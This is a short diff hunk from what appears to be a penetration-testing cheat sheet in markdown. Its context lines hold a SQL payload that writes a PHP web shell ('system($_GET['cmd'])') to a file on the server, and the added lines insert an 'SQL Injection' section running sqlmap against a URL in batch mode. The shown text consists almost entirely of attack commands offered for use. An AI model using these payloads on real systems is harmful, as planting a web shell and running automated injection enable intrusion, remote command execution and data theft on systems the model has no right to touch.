@@ -59,6 +59,10 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 mysql -h localhost -u myname -p
 ```
+### SQL Injection
+```
+sqlmap -u url --batch
+```
 
 ## Request
 ### Curl
